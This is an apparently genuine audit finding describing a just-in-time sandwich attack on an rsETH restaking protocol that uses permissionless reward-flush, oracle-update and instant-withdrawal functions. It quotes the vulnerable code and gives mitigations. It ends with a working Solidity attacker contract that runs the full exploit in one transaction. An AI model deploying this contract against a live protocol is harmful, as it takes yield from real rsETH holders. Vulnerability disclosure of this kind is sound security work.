### Title
Permissionless `FeeReceiver.sendFunds()` + `LRTOracle.updateRSETHPrice()` Enables JIT Sandwich Attack to Steal Yield from rsETH Holders — (`contracts/FeeReceiver.sol`, `contracts/LRTOracle.sol`, `contracts/LRTWithdrawalManager.sol`)

---

### Summary

`FeeReceiver.sendFunds()` is a permissionless function that flushes accumulated MEV/execution-layer ETH rewards into `LRTDepositPool`. `LRTOracle.updateRSETHPrice()` is also permissionless and immediately reprices rsETH upward when TVL has grown. `LRTWithdrawalManager.instantWithdrawal()` is permissionless (when enabled) and redeems rsETH at the current oracle price. An attacker can atomically: (1) deposit ETH to mint rsETH at the pre-reward price, (2) trigger reward distribution and price update, (3) instantly withdraw at the post-reward price — capturing a disproportionate share of the yield that should accrue to existing rsETH holders.

---

### Finding Description

**`FeeReceiver.sendFunds()` — no access control:**

```solidity
// contracts/FeeReceiver.sol
function sendFunds() external {
    uint256 balance = address(this).balance;
    ILRTDepositPool(depositPool).receiveFromRewardReceiver{ value: balance }();
    emit MevRewardsAddedToTVL(balance);
}
```

Any caller can flush the entire accumulated ETH balance of `FeeReceiver` into `LRTDepositPool` at will.

**`LRTOracle.updateRSETHPrice()` — permissionless price update:**

```solidity
// contracts/LRTOracle.sol
function updateRSETHPrice() public whenNotPaused {
    _updateRsETHPrice();
}
```

`_updateRsETHPrice()` computes `newRsETHPrice = (totalETHInProtocol - protocolFeeInETH) / rsethSupply`. When `totalETHInProtocol > previousTVL` (i.e., after `sendFunds()` deposits rewards), `newRsETHPrice > rsETHPrice`. Any caller can trigger this repricing.

**`LRTWithdrawalManager.instantWithdrawal()` — redeems at current oracle price:**

```solidity
// contracts/LRTWithdrawalManager.sol
uint256 assetAmountUnlocked = getExpectedAssetAmount(asset, rsETHUnstaked);
IRSETH(lrtConfig.rsETH()).burnFrom(address(msg.sender), rsETHUnstaked);
...
uint256 fee = (assetAmountUnlocked * instantWithdrawalFee) / 10_000;
uint256 userAmount = assetAmountUnlocked - fee;
_transferAsset(asset, msg.sender, userAmount);
```

`getExpectedAssetAmount` uses the live `rsETHPrice` from the oracle. If the price was just updated upward, the attacker redeems at the higher rate.

**The three permissionless functions compose into a complete sandwich:**

1. Attacker deposits `X` ETH into `LRTDepositPool.depositETH()` at price `P1`, receiving `X / P1` rsETH.
2. Attacker calls `FeeReceiver.sendFunds()` — accumulated reward `R` ETH enters the deposit pool, raising TVL.
3. Attacker calls `LRTOracle.updateRSETHPrice()` — price updates to `P2 = (TVL + R) / totalSupply > P1`.
4. Attacker calls `LRTWithdrawalManager.instantWithdrawal()` — burns `X / P1` rsETH, receives `(X / P1) * P2` ETH minus the instant-withdrawal fee.

Attacker profit ≈ `X * (P2/P1 − 1) − fee`. Existing rsETH holders lose the fraction of `R` that the attacker's newly minted rsETH captured.

All four steps can be executed atomically in a single transaction via a smart contract, requiring no flash loan if the attacker has sufficient ETH.

---

### Impact Explanation

**High — Theft of unclaimed yield.**

Existing rsETH holders accumulate yield as MEV/execution-layer rewards flow into the protocol. The attacker intercepts a portion of each reward batch by minting rsETH immediately before the price update and burning it immediately after. The attacker provides no lasting liquidity and bears no protocol risk; the yield is simply redirected from long-term holders to the attacker. With a zero or low `instantWithdrawalFee`, the attack is unconditionally profitable whenever `FeeReceiver` holds a non-trivial balance. Even with a 10% fee cap, a sufficiently large reward batch (or flash-loan-amplified deposit) makes the attack profitable.

---

### Likelihood Explanation

**High.** All three entry points (`sendFunds`, `updateRSETHPrice`, `instantWithdrawal`) are permissionless and callable by any EOA or contract. MEV rewards accumulate continuously in `FeeReceiver`, creating a recurring, predictable opportunity. The attack is atomic, requires no privileged access, and is straightforwardly detectable on-chain by monitoring `FeeReceiver.balance`. Any MEV searcher or sophisticated actor will identify and exploit this pattern.

---

### Recommendation

1. **Restrict `FeeReceiver.sendFunds()`** to a trusted role (e.g., `MANAGER` or `OPERATOR`), preventing arbitrary callers from timing reward flushes.
2. **Distribute rewards gradually** (e.g., stream over 24 hours after `sendFunds()` is called) so no single block captures the full price jump.
3. **Add a minimum holding period** before rsETH minted in a given block can be used in `instantWithdrawal`, analogous to the `withdrawalDelayBlocks` already present for queued withdrawals.
4. **Alternatively**, make `updateRSETHPrice()` callable only by a keeper/manager role, breaking the attacker's ability to atomically compose all three steps.

### Proof of Concept

```solidity
// Attacker contract — all steps in one transaction
contract JITAttack {
    ILRTDepositPool depositPool;
    IFeeReceiver    feeReceiver;
    ILRTOracle      oracle;
    ILRTWithdrawalManager withdrawalMgr;
    IRSETH          rsETH;

    function attack() external payable {
        // Step 1: mint rsETH at current (pre-reward) price
        depositPool.depositETH{value: msg.value}(0, "");

        // Step 2: flush accumulated MEV rewards into deposit pool
        feeReceiver.sendFunds();

        // Step 3: reprice rsETH upward
        oracle.updateRSETHPrice();

        // Step 4: redeem rsETH at the new (higher) price
        uint256 rsETHBal = rsETH.balanceOf(address(this));
        rsETH.approve(address(withdrawalMgr), rsETHBal);
        withdrawalMgr.instantWithdrawal(ETH_TOKEN, rsETHBal, "");

        // Profit: received ETH > msg.value (minus instantWithdrawalFee)
        payable(msg.sender).transfer(address(this).balance);
    }
    receive() external payable {}
}
